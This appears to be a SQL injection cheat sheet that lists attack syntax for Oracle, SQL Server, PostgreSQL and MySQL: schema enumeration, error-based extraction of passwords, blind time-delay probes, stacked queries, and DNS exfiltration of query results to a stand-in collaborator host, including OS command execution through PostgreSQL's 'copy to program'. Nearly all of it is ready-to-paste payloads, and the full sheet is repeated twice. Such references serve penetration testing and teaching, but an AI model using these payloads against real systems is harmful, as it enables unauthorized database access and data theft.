# SQL Injection Cheat Sheet

This cheat sheet contains examples of useful syntax for performing various tasks in SQL injection attacks.

---

## **String Concatenation**

You can concatenate multiple strings to create a single string:

| Database    | Syntax               |
|-------------|----------------------|
| **Oracle**  | `'foo'||'bar'`       |
| **Microsoft** | `'foo'+'bar'`       |
| **PostgreSQL** | `'foo'||'bar'`     |
| **MySQL**   | `'foo' 'bar'` (space between) or `CONCAT('foo','bar')` |

---

## **Substring Extraction**

Extract a part of a string from a specified offset with a specified length. The offset index is 1-based. Each of the following examples will return the string `ba`:

| Database    | Syntax                     |
|-------------|----------------------------|
| **Oracle**  | `SUBSTR('foobar', 4, 2)`   |
| **Microsoft** | `SUBSTRING('foobar', 4, 2)` |
| **PostgreSQL** | `SUBSTRING('foobar', 4, 2)` |
| **MySQL**   | `SUBSTRING('foobar', 4, 2)` |

---

## **Comments**

You can use comments to truncate a query and remove the portion of the original query that follows your input:

| Database    | Syntax                   |
|-------------|--------------------------|
| **Oracle**  | `--comment`              |
| **Microsoft** | `--comment` or `/*comment*/` |
| **PostgreSQL** | `--comment` or `/*comment*/` |
| **MySQL**   | `#comment`, `-- comment` (space required), or `/*comment*/` |

---

## **Database Version**

Query the database type and version:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| **Microsoft** | `SELECT @@version`                     |
| **PostgreSQL** | `SELECT version()`                    |
| **MySQL**   | `SELECT @@version`                       |

---

## **Database Contents**

List the tables and columns in the database:

| Database    | List Tables                              | List Columns                              |
|-------------|------------------------------------------|------------------------------------------|
| **Oracle**  | `SELECT * FROM all_tables`              | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **Microsoft** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **PostgreSQL** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **MySQL**   | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

---

## **Conditional Errors**

Trigger a database error if a single boolean condition is true:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **Microsoft** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| **MySQL**   | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

---

## **Extracting Data via Visible Error Messages**

Elicit error messages that leak sensitive data returned by your query:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Microsoft** | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>*Error:* Conversion failed when converting the varchar value 'secret' to data type int. |
| **PostgreSQL** | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>*Error:* invalid input syntax for integer: "secret" |
| **MySQL**   | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>*Error:* XPATH syntax error: '\\secret' |

---

## **Batched (or Stacked) Queries**

Execute multiple queries in succession (useful for blind vulnerabilities):

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | Not supported                           |
| **Microsoft** | `QUERY-1-HERE; QUERY-2-HERE`           |
| **PostgreSQL** | `QUERY-1-HERE; QUERY-2-HERE`          |
| **MySQL**   | `QUERY-1-HERE; QUERY-2-HERE` (only in certain APIs) |

---

## **Time Delays**

Cause a time delay in the database when the query is processed:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `dbms_pipe.receive_message(('a'),10)`    |
| **Microsoft** | `WAITFOR DELAY '0:0:10'`               |
| **PostgreSQL** | `SELECT pg_sleep(10)`                 |
| **MySQL**   | `SELECT SLEEP(10)`                      |

---

## **Conditional Time Delays**

Trigger a time delay if a single boolean condition is true:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| **Microsoft** | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL**   | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

---

## **DNS Lookup**

Cause the database to perform a DNS lookup to an external domain (requires Burp Collaborator):

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual`<br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| **Microsoft** | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| **MySQL**   | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'` |

---

## **DNS Lookup with Data Exfiltration**

Perform a DNS lookup containing the results of an injected query:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual` |
| **Microsoft** | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a\"')` |
| **PostgreSQL** | Use custom function:<br>```sql\ncreate OR replace function f() returns void as $$\ndeclare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();``` |
| **MySQL**   | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'` |

---

Use these techniques responsibly and only in authorized environments.
# SQL Injection Cheat Sheet

This cheat sheet contains examples of useful syntax for performing various tasks in SQL injection attacks.

---

## **String Concatenation**

You can concatenate multiple strings to create a single string:

| Database    | Syntax               |
|-------------|----------------------|
| **Oracle**  | `'foo'||'bar'`       |
| **Microsoft** | `'foo'+'bar'`       |
| **PostgreSQL** | `'foo'||'bar'`     |
| **MySQL**   | `'foo' 'bar'` (space between) or `CONCAT('foo','bar')` |

---

## **Substring Extraction**

Extract a part of a string from a specified offset with a specified length. The offset index is 1-based. Each of the following examples will return the string `ba`:

| Database    | Syntax                     |
|-------------|----------------------------|
| **Oracle**  | `SUBSTR('foobar', 4, 2)`   |
| **Microsoft** | `SUBSTRING('foobar', 4, 2)` |
| **PostgreSQL** | `SUBSTRING('foobar', 4, 2)` |
| **MySQL**   | `SUBSTRING('foobar', 4, 2)` |

---

## **Comments**

You can use comments to truncate a query and remove the portion of the original query that follows your input:

| Database    | Syntax                   |
|-------------|--------------------------|
| **Oracle**  | `--comment`              |
| **Microsoft** | `--comment` or `/*comment*/` |
| **PostgreSQL** | `--comment` or `/*comment*/` |
| **MySQL**   | `#comment`, `-- comment` (space required), or `/*comment*/` |

---

## **Database Version**

Query the database type and version:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| **Microsoft** | `SELECT @@version`                     |
| **PostgreSQL** | `SELECT version()`                    |
| **MySQL**   | `SELECT @@version`                       |

---

## **Database Contents**

List the tables and columns in the database:

| Database    | List Tables                              | List Columns                              |
|-------------|------------------------------------------|------------------------------------------|
| **Oracle**  | `SELECT * FROM all_tables`              | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **Microsoft** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **PostgreSQL** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **MySQL**   | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

---

## **Conditional Errors**

Trigger a database error if a single boolean condition is true:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **Microsoft** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| **MySQL**   | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

---

## **Extracting Data via Visible Error Messages**

Elicit error messages that leak sensitive data returned by your query:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Microsoft** | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>*Error:* Conversion failed when converting the varchar value 'secret' to data type int. |
| **PostgreSQL** | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>*Error:* invalid input syntax for integer: "secret" |
| **MySQL**   | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>*Error:* XPATH syntax error: '\\secret' |

---

## **Batched (or Stacked) Queries**

Execute multiple queries in succession (useful for blind vulnerabilities):

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | Not supported                           |
| **Microsoft** | `QUERY-1-HERE; QUERY-2-HERE`           |
| **PostgreSQL** | `QUERY-1-HERE; QUERY-2-HERE`          |
| **MySQL**   | `QUERY-1-HERE; QUERY-2-HERE` (only in certain APIs) |

---

## **Time Delays**

Cause a time delay in the database when the query is processed:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `dbms_pipe.receive_message(('a'),10)`    |
| **Microsoft** | `WAITFOR DELAY '0:0:10'`               |
| **PostgreSQL** | `SELECT pg_sleep(10)`                 |
| **MySQL**   | `SELECT SLEEP(10)`                      |

---

## **Conditional Time Delays**

Trigger a time delay if a single boolean condition is true:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| **Microsoft** | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL**   | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

---

## **DNS Lookup**

Cause the database to perform a DNS lookup to an external domain (requires Burp Collaborator):

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual`<br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| **Microsoft** | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| **MySQL**   | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'` |

---

## **DNS Lookup with Data Exfiltration**

Perform a DNS lookup containing the results of an injected query:

| Database    | Syntax                                   |
|-------------|------------------------------------------|
| **Oracle**  | `SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual` |
| **Microsoft** | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \"//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a\"')` |
| **PostgreSQL** | Use custom function:<br>```sql\ncreate OR replace function f() returns void as $$\ndeclare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();``` |
| **MySQL**   | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'` |

---
